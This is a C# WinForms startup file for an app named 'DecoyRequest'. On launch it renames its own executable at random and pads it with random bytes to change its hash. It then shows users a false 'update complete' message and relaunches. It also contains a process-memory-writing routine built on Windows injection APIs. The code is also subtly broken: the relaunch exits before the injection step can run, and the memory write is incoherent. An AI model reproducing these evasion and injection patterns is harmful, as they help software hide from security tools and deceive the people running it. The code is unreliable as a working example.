using DecoyRequest;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace DecoyRequest
{
    internal static class Program
    {
        #region DllImports
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        #endregion

        /// <summary>
        /// Uygulamanın ana girdi noktası.
        /// </summary>
        [STAThread]
        static void Main()
        {
            CreateRequiredFolders();
            string newProcessName = UpdateExecutable();
            CheckAndWarnIfDecoyRequest();
            InjectCode(newProcessName);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Main());
        }

        private static void CreateRequiredFolders()
        {
            if (!Directory.Exists(Globals.DataFolder))
            {
                Directory.CreateDirectory(Globals.DataFolder);
            }

            if (!Directory.Exists(Globals.SecurityFolder))
            {
                Directory.CreateDirectory(Globals.SecurityFolder);
            }

            string logFolder = Path.GetDirectoryName(Globals.LogFilePath);
            if (!Directory.Exists(logFolder))
            {
                Directory.CreateDirectory(logFolder);
            }

            string certFolder = Path.GetDirectoryName(Globals.CertLocation);
            if (!Directory.Exists(certFolder))
            {
                Directory.CreateDirectory(certFolder);
            }

            string musicFolder = Path.GetDirectoryName(Globals.MusicPath);
            if (!Directory.Exists(musicFolder))
            {
                Directory.CreateDirectory(musicFolder);
            }
        }

        private static void CheckAndWarnIfDecoyRequest()
        {
            Process[] processes = Process.GetProcessesByName("DecoyRequest");
            if (processes.Length > 0)
            {
                MessageBox.Show("Restart the app for security.", "Warning", MessageBoxButtons.OK);
                Environment.Exit(0);
            }
        }

        private static string UpdateExecutable()
        {
            try
            {
                string errorLogPath = Globals.LogFilePath;

                if (File.Exists(errorLogPath))
                {
                    File.Delete(errorLogPath);
                }

                string currentPath = Assembly.GetExecutingAssembly().Location;
                string newFileName = "D" + RandomNumbers(4) + "R" + RandomNumbers(7) + ".exe";
                string newPath = Path.Combine(Path.GetDirectoryName(currentPath), newFileName);

                File.Move(currentPath, newPath);

                AddRandomData(newPath);

                MessageBox.Show("The app has been updated. Please relaunch.", "Update Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);

                Process.Start(newPath);
                Environment.Exit(0);

                return Path.GetFileNameWithoutExtension(newFileName);
            }
            catch (Exception ex)
            {
                File.AppendAllText(Globals.LogFilePath, $"[{DateTime.Now}] {ex.Message}{Environment.NewLine}");
                return null;
            }
        }

        private static void AddRandomData(string filePath)
        {
            using (var stream = new FileStream(filePath, FileMode.Append, FileAccess.Write))
            {
                byte[] randomData = new byte[20480];
                using (var rng = new RNGCryptoServiceProvider())
                {
                    rng.GetBytes(randomData);
                }
                stream.Write(randomData, 0, randomData.Length);
            }
        }

        private static string RandomNumbers(int length)
        {
            const string digits = "0123456789";
            var numberChars = new char[length];
            using (var rng = new RNGCryptoServiceProvider())
            {
                byte[] randomData = new byte[length];
                rng.GetBytes(randomData);
                for (int i = 0; i < numberChars.Length; i++)
                {
                    numberChars[i] = digits[randomData[i] % digits.Length];
                }
            }
            return new string(numberChars);
        }

        private static void InjectCode(string processName)
        {
            if (string.IsNullOrEmpty(processName))
            {
                return;
            }

            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length > 0)
            {
                IntPtr hProcess = OpenProcess(0x1F0FFF, false, processes[0].Id);
                if (hProcess != IntPtr.Zero)
                {
                    IntPtr hModule = GetModuleHandle("kernel32.dll");
                    IntPtr hProc = GetProcAddress(hModule, "LoadLibraryA");
                    byte[] bytes = BitConverter.GetBytes(0);
                    WriteProcessMemory(hProcess, hProc, bytes, bytes.Length, out int bytesWritten);
                    CloseHandle(hProcess);
                }
            }
        }
    }
}